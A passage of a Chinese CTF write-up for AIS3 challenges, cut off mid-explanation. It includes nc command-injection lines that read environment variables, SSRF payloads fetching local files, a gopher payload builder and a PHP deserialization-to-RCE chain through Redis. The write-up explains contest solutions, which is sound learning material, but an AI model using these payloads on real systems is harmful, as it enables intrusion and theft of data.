.right) | setpath([\u0026quot;right\u0026quot;]; .tmp) | delpaths([[\u0026quot;tmp\u0026quot;]])) else . end)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e.body | walk(if type == \u0026quot;object\u0026quot; and (has(\u0026quot;value\u0026quot;) | not) then (if ([.op] | contains([\u0026quot;Add\u0026quot;])) then setpath([\u0026quot;value\u0026quot;]; (.left.value + .right.value)) else (if ([.op] | contains([\u0026quot;Sub\u0026quot;])) then setpath([\u0026quot;value\u0026quot;]; (.left.value - .right.value)) else (if ([.op] | contains([\u0026quot;Mult\u0026quot;])) then setpath([\u0026quot;value\u0026quot;]; (.left.value * .right.value)) else (if ([.op] | contains([\u0026quot;Div\u0026quot;])) then setpath([\u0026quot;value\u0026quot;]; (.left.value / .right.value)) else . end) end) end) end) else . end) | .value\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168675477-8291831f-8eef-4fe8-9d54-c206a2e0d4e4.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"flag-4\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{pr0gramm1ng_in_a_json_proce55in9_too1}\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"seadogs-webshell\"\u003eSeadog\u0026rsquo;s Webshell\u003c/h3\u003e\n\u003ch4 id=\"題目-5\"\u003e題目\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168675551-456344b7-b571-4a41-8150-e690d4daad11.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168675613-e4cab9ef-526e-44ee-be20-c55ed900b7ef.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"important-source-code\"\u003eImportant Source Code\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexec 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebase64 | timeout 10s sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"解題-4\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e送進去的 code 必須同時符合 base64 的格式將其解碼送進去，因此 script 就用 \u003ccode\u003eecho \u0026quot;//bin/ls\u0026quot; | base64 -d\u003c/code\u003e 然後再 pipe 進 nc，並且用絕對路徑，這樣就可以用 \u003ccode\u003e/\u003c/code\u003e 填空位。\n然而卻發現怎麼試都沒反應，因此用自己機器試了一下，發現 nc 沒送 eof，所以加了個 \u003ccode\u003e-q 1\u003c/code\u003e。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;//bin/ls\u0026#34;\u003c/span\u003e | base64 -d | nc -q \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e chals1.ais3.org \u003cspan style=\"color:#ae81ff\"\u003e12369\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168675770-9f22fdf6-eae4-4747-8afe-e90b71ccc9f6.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e成功\u003c/p\u003e\n\u003cp\u003e最後因為 flag 在 environment (根據 docker-ccompose.yml) 所以執行\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/usr/bin/env\u0026#34;\u003c/span\u003e | base64 -d | nc -q \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e chals1.ais3.org \u003cspan style=\"color:#ae81ff\"\u003e12369\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168675828-91d4687e-ce81-4802-911d-45dc6a5c455c.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"flag-5\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{ZXNjYXBpbmdfYmFzZTY0X3dpdGhfZW9m}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"reverse\"\u003eReverse\u003c/h2\u003e\n\u003ch3 id=\"calculator\"\u003eCalculator\u003c/h3\u003e\n\u003ch4 id=\"題目-6\"\u003e題目\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168676022-6f52e70e-e428-4ed4-af96-f86f10d78dc5.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題-5\"\u003e解題\u003c/h4\u003e\n\u003cp\u003ednspy 看 Extension.AIS3 到 AIS3333 這幾個 dll 然後按照 Operate method 內的規則將 Flag 一個字一個自填完。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168676149-2687d916-676c-42fc-9356-2597530d7c2d.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168676217-77abca3a-acad-402d-afb7-13b9d4128a40.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168676290-17a03d7b-bc30-41fe-a59a-b4fbf00b747f.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168676387-3a92151a-999f-4564-b60e-6b917ffb7abf.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"flag-6\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{D0T_N3T_FRAm3W0rk_15_S0_C0mPlicaT3d__G_G}\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"strings\"\u003eStrings\u003c/h3\u003e\n\u003ch4 id=\"題目-7\"\u003e題目\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168676539-b52b4be4-cace-42f7-89b8-3e88fe25c4c8.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題-6\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e既然叫 strings 那就先 strings 一次\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168676653-150a2672-4bb4-4bcc-90cc-e87ba30b2295.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e噴出來的 flag 是假的，但也是提示\u003c/p\u003e\n\u003cp\u003e把阿姨開起來打開 String view 搜假 flag 點兩下到 IDA View 接著 \u003ccode\u003e.data.rel.ro:000055CBACEDDDB0\u003c/code\u003e 點兩下跳過去，然後再網上一點可以看到 \u003ccode\u003eoff_55CBACEDDDA0\u003c/code\u003e(應該是變數名稱ㄅ) 點兩下 \u003ccode\u003estrings::main::h34e687dfba9cc523\u003c/code\u003e 就能直達主程式的地方\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168676850-47fe0177-b77d-481c-b091-6def6c6b60f8.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168676909-3c464331-ab05-446d-9e61-1794a127c2f8.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168676966-ccfc3bb2-4cb5-4dbb-9831-e2fa57dddd4d.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168677209-3291d2fc-a304-4aac-9f5d-7225d8929211.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003eF5 反編譯然後開始跑 Debug\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168677122-fa3f1c6f-b32e-4d8d-9cc0-42978091b2c9.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e可以看到有一個 \u003ccode\u003ecore::str::_$LT$impl$u20$str$GT$::split\u003c/code\u003e 這應該是 Rust 寫的，可以看到有一個 \u003ccode\u003e\u0026quot;_\u0026quot;\u003c/code\u003e 參數，應該是用 \u003ccode\u003e\u0026quot;_\u0026quot;\u003c/code\u003e 去拆分字串\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168677345-1eaed10e-80e6-4aa7-91f2-bbb13ad0a256.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e而後來在走到這邊時得到確認 \u003ccode\u003eif ( alloc::vec::Vec$LT$T$C$A$GT$::len::hd32fa3309483c80e(v41) == 11 )\u003c/code\u003e 代表 split 後的字串要有 11 個\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168677418-25d50774-255d-4e7d-92fc-c25de01e02fc.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eif ( (core::cmp::impls::_$LT$impl$u20$core..cmp..PartialEq$LT$$RF$B$GT$$u20$for$u20$$RF$A$GT$::ne::h0948eadbdbca5c0e( v25, \u0026amp;(\u0026amp;off_55CBACEDDDA0)[2 * v21]) \u0026amp; 1) != 0 )\u003c/code\u003e\n這邊的話應該是  \u003ccode\u003ev25 != \u0026amp;(\u0026amp;off_55CBACEDDDA0)[2 * v21]\u003c/code\u003e 的話就算 \u003ccode\u003eincorrect flag\u003c/code\u003e 而 \u003ccode\u003ev21\u003c/code\u003e 則是從上面一個 \u003ccode\u003edest\u003c/code\u003e array 來的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168677576-7b5264c9-81f0-4077-8df5-03fa0c17708d.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003edest\u003c/code\u003e array 的內容是 \u003ccode\u003e[0x0, 0x4, 0x10, 0xD, 0xA, 0x4, 0x8, 0x7, 0x1, 0x2, 0x12]\u003c/code\u003e 換 10 進的話是 \u003ccode\u003e[0, 4, 16, 13, 10, 4, 8, 7, 1, 2, 18]\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168678100-55920cd6-2e69-4f9e-8d1f-b1268b11d12a.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e再找切分依據找了一陣子，最後有注意到 \u003ccode\u003eif ( v21 \u0026gt;= 0x13 )\u003c/code\u003e 符合的話會跑一個程式而且 Array 最後也是 18 而且剛好只有 11 個，我猜應該是最多只有 18 組。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168678269-458e7911-5b3d-48f6-8b62-5a7bd44b7c1e.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e回到 \u003ccode\u003eoff_55CBACEDDDA0\u003c/code\u003e 的 IDA View 時，又注意到它這邊有分 18 行，每行剛好就前進一個單字，除了第一個 \u0026ldquo;AIS3{\u0026rdquo; 跟最後一個 \u0026ldquo;}\u0026rdquo;\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168678438-91012e82-e331-43b6-8ba2-749c4d129a77.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e於是我認為它的切分應該是長這樣 \u003ccode\u003eAIS3{_good_luck_finding_the_flags_value_using_strings_command_guess_which_substring_is_our_actual_answer_lmaoo_}\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e接著就簡單了，按照 dest 一個一個接回來送 ./strings 也回 correct flag 這樣就解掉了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168678617-90766d68-27c6-469b-8c6f-01fb14bba3dc.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"flag-7\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{_the_answer_is_guess_the_strings_using_good_luck_}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"poking-bear\"\u003ePoking Bear\u003c/h3\u003e\n\u003ch4 id=\"題目-8\"\u003e題目\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168678736-f76ecd4f-cf71-4842-9ca6-839b26e546d8.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題-7\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e網頁內容是你可以選一隻 bear poke，但你要 poke 到 SECRET BEAR 才能拿到 Flag，但是 SECRET BEAR 的 bear id 他是隱藏的，然而第一隻到最後一隻的 id 是 5-999 那就用最原始的方式爆掃一波。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168678831-361e73c3-1421-4553-95f0-74fad6484303.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168678912-82276a1c-5dcd-452c-9c89-cc289145faa5.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168678942-0dade361-5815-4c8b-868a-db1a90d7d550.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026gt; /tmp/output\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a in \u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eseq \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e 1000\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$a\u003cspan style=\"color:#e6db74\"\u003e: \u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ecurl -X POST http://chals1.ais3.org:8987/poke -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;bear_id=\u003c/span\u003e$a\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /tmp/output \u0026amp;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168679172-e8275cf9-dde3-4a8c-93ad-d273d5f9edf4.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e找與眾不同的那個\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egrep -v \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;You shouldn\u0026#39;t poke a cat!\u0026#34;\u003c/span\u003e /tmp/output | grep -v \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Poked, but nothing happened!\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168679215-cf3a67b0-3693-4872-a510-faff04ff99b2.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e他說你不是 \u003ccode\u003ebear poker\u003c/code\u003e 八成要改 cookie。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl -X POST http://chals1.ais3.org:8987/poke --header \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cookie: human=\\\u0026#34;bear poker\\\u0026#34;\u0026#34;\u003c/span\u003e -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;bear_id=499\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168679292-88af88d7-6247-4565-a814-babb679dc24c.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"flag-8\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{y0u_P0l\u0026lt;3_7h3_Bear_H@rdLy\u0026gt;\u0026lt;}\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"private-browsing\"\u003ePrivate Browsing\u003c/h3\u003e\n\u003ch4 id=\"題目-9\"\u003e題目\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168679457-367f5a33-25db-4a3e-8f4e-244d8f1f7746.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題-8\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e看起來是很經典的 ssrf 雖說前端鎖定 \u003ccode\u003ehttp[s]\u003c/code\u003e 但後端沒鎖，所以直接用 \u003ccode\u003e/api.php\u003c/code\u003e 做 ssrf。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168679552-88a04987-7d50-483e-96ff-3c07959cb7ee.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e先 \u003ccode\u003ehttp://chals1.ais3.org:8763/api.php?action=view\u0026amp;url=file:///proc/net/tcp\u003c/code\u003e 看有那些機器可以打。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168679688-0c967c35-cb63-431f-955d-16314138d99f.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e可以看到 server 頻繁的對 \u003ccode\u003e192.168.224.2:6379\u003c/code\u003e 做存取\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168679788-895144f3-7c15-491a-a442-9a722c921126.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003egoogle 查到 tcp 6379 port 是 redis\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehttp://chals1.ais3.org:8763/api.php?action=view\u0026amp;url=dict://192.168.224.2:6379/info\u003c/code\u003e 證實了是 redis。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168679873-1df967d9-9962-4c41-99e1-9482f9ebd724.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e但資訊依然不夠，因此抓 source code  \u003ccode\u003ehttp://chals1.ais3.org:8763/api.php?action=view\u0026amp;url=file:///var/www/html/api.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168679976-11321211-7ae7-4d26-81b0-c9f9d53d475e.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e有一個 \u003ccode\u003erequire_once 'session.php'\u003c/code\u003e 把他抓下來 \u003ccode\u003ehttp://chals1.ais3.org:8763/api.php?action=view\u0026amp;url=file:///var/www/html/session.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168680029-3bd44063-68a1-47d3-8907-96a9e6adc53f.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e經過長時間的閱讀後可以發現他會將 cookie \u003ccode\u003esess_id\u003c/code\u003e 作為 key，現在所用的 \u003ccode\u003eBrowsingSession\u003c/code\u003e class serialize 後儲存到 redis 格式是長這樣 \u003ccode\u003eO:15:\u0026quot;BrowsingSession\u0026quot;:1:{s:7:\u0026quot;history\u0026quot;;a:1:{i:0;s:19:\u0026quot;https://google.com/\u0026quot;;}}\u003c/code\u003e 這就是他做 history 的方式。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168680103-d9a97b08-e658-4fa6-8ffb-91ba0c8a9c97.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168680292-7ac1febd-13a0-48a6-b4ca-a9aead5ff853.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e這樣的話就可以用這隻 script 建立 payload (dict 的話冒號會不見)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e urllib.parse \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e quote\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etcp_payload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eurl \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;gopher://\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eip\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e:6379/_\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003equote(tcp_payload)\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(url)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e但是 \u003ccode\u003eBrowsingSession\u003c/code\u003e 並沒有可以利用這點做 RCE 的地方，因為他只有一個 \u003ccode\u003ehistory\u003c/code\u003e 的 variable 並作為 array 做存取。\u003c/p\u003e\n\u003cp\u003e發現 \u003ccode\u003eSessionManager\u003c/code\u003e 的 \u003ccode\u003eencode\u003c/code\u003e 跟 \u003ccode\u003edecode\u003c/code\u003e 是 variable function 執行位置是在 \u003ccode\u003eget()\u003c/code\u003e 跟 \u003ccode\u003e__destruct()\u003c/code\u003e(解構子)\u003c/p\u003e\n\u003cp\u003e原本是著利用 \u003ccode\u003eget()\u003c/code\u003e 做 RCE 因為外層的 \u003ccode\u003eSessionManager\u003c/code\u003e 再跑 \u003ccode\u003e$session-\u0026gt;push\u003c/code\u003e 會用 \u003ccode\u003e__call()\u003c/code\u003e return 的 class 去執行 \u003ccode\u003epush\u003c/code\u003e\n而 \u003ccode\u003eget()\u003c/code\u003e 的內容是 \u003ccode\u003eval\u003c/code\u003e 有東西就直接 return，redis 內有東西就直接 decode redis 的 value，都沒就建一個，而存在 redis 的東西被使用 \u003ccode\u003egopher://192.168.224.2:6379/_SET%20fc57bda95a5184e55555%20%22O%3A14%3A%5C%22SessionManager%5C%22%3A3%3A%5C%7Bs%3A3%3A%5C%22val%5C%22%3BN%3Bs%3A6%3A%5C%22decode%5C%22%3Bs%3A6%3A%5C%22system%5C%22%3Bs%3A6%3A%5C%22sessid%5C%22%3Bs%3A4%3A%5C%22code%5C%22%3B%5C%7D%22\u003c/code\u003e 改成 \u003ccode\u003eO:14:\u0026quot;SessionManager\u0026quot;:3:{s:3:\u0026quot;val\u0026quot;;N;s:6:\u0026quot;decode\u0026quot;;s:6:\u0026quot;system\u0026quot;;s:6:\u0026quot;sessid\u0026quot;;s:4:\u0026quot;code\u0026quot;;}\u003c/code\u003e\n所以他會跑內部的 \u003ccode\u003eSessionManager\u003c/code\u003e 的 \u003ccode\u003e__call()\u003c/code\u003e 然後 call \u003ccode\u003eget()\u003c/code\u003e 因為 \u003ccode\u003eval\u003c/code\u003e 是 null 所以會找 redis，因 redis 的 value 有用 \u003ccode\u003edict://192.168.224.2:6379/SET%20code%20%22ls%22\u003c/code\u003e 設 \u003ccode\u003ecode\u003c/code\u003e 為 \u003ccode\u003els\u003c/code\u003e 的 command 且 \u003ccode\u003edecode\u003c/code\u003e 被改成 \u003ccode\u003esystem\u003c/code\u003e 所以會 RCE。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168680691-80edc434-15b8-452f-815a-b385a0cfe275.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168680802-cd723fc9-fa33-428e-9926-862e7438dc30.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e然而忽略了一點是 \u003ccode\u003eget()\u003c/code\u003e 內的 redis 是 \u003ccode\u003e$this\u003c/code\u003e 下面的而非 \u003ccode\u003eglobal\u003c/code\u003e 而 connect 後的 redis 無法用 \u003ccode\u003eunserialize\u003c/code\u003e 製造，所以用 \u003ccode\u003eget()\u003c/code\u003e RCE 會是失敗的。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168680978-db80ee91-3815-4818-b47d-df422484bcb4.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e後來想到如果成是 error 內部的 \u003ccode\u003eSessionManager\u003c/code\u003e 也會做 \u003ccode\u003e__destruct()\u003c/code\u003e 因此用 